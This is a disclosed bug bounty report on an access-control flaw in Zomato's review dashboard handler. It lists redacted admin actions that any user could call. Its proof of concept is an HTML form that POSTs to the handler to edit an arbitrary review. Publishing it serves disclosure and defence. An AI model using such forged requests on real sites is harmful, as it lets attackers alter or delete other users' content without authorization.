# [www.zomato.com] Privilege Escalation - Control reviews - /████dashboard_handler.php

## Report Details
- **Report ID**: 300099
- **URL**: https://hackerone.com/reports/300099
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-12-22T18:51:47.061Z
- **Disclosed**: 2018-03-29T16:58:58.029Z

## Reporter
- **Username**: gerben_javado
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
#Introduction 
The handler that controls all the ███ actions for reviews is accessible for any user. The following actions are thus being left open to anyone: 

```
get_manager_status
read███████
unread██████████
████████
feature██████
unfeature████████
moderate████
unmoderate█████
drop
███
send_mail
█████████
revoke
mark-spam
spam-revoke
remove-██████
add-█████████
reject_reported█████████
███████
```
Taken from the following [██████████]████████

#POC
This POC will use the action `██████` since it easily allows us to edit any review on Zomato.com. More severe options could be ██████ to read user info.

```html
<form action="https://www.zomato.com/██████████dashboard_handler.php" method="POST">
      <input type="hidden" name="action" value="█████" />
      <input type="hidden" name="review_id" value="31268525" />
      <input type="hidden" name="review" value="Privilege+Escalation" />
      <input type="submit" value="Submit request" />
</form>
```

Go to https://www.zomato.com/review/QvneAY and see the review has changed.

## Impact

Any user is able to control all the ████ actions for the reviews section including emailing, deleting, editing and adding to ██████████.

## Attachments
No attachments
